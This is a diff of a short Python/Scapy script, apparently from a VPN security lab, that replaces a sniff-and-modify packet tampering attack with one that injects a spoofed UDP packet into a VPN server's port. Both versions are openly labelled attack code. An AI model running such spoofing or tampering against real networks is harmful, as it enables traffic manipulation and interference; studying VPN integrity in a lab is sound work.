@@ -1,25 +1,17 @@
 #!/usr/bin/env python3
-from scapy.all import sniff, send, IP, UDP, Raw
+import socket
+from scapy.all import *
 
-def log_event(msg):
-    print(f"[TAMPER] {msg}")
+SERVER_IP = "10.9.0.11"   # VPN server's IP in the Docker network
+SERVER_PORT = 9090
 
-def tamper_packets(server_ip="10.9.0.11", vpn_port=9090):
-    log_event("Starting data tampering attack")
+# Craft a fake IP packet with spoofed content
+ip = IP(src="192.168.60.5", dst="8.8.8.8")
+udp = UDP(sport=12345, dport=53)
+payload = b"THIS IS A TAMPERED PACKET"
+pkt = ip / udp / Raw(load=payload)
 
-    def modify_packet(pkt):
-        if UDP in pkt and pkt[UDP].dport == vpn_port and Raw in pkt:
-            original = bytes(pkt[Raw].load)
-            modified = original.replace(b'a', b'X')  # Simple visible change
-
-            tampered_pkt = IP(dst=pkt[IP].dst, src=pkt[IP].src) / \
-                           UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport) / \
-                           modified
-
-            send(tampered_pkt, verbose=0)
-            log_event(f"Tampered: {original[:16]}... -> {modified[:16]}...")
-
-    sniff(filter=f"udp and dst port {vpn_port}", prn=modify_packet, store=0)
-
-if __name__ == "__main__":
-    tamper_packets()
+# Send it directly to the VPN server's UDP port
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(bytes(pkt), (SERVER_IP, SERVER_PORT))
+print("🚨 Tampered packet sent to server!")
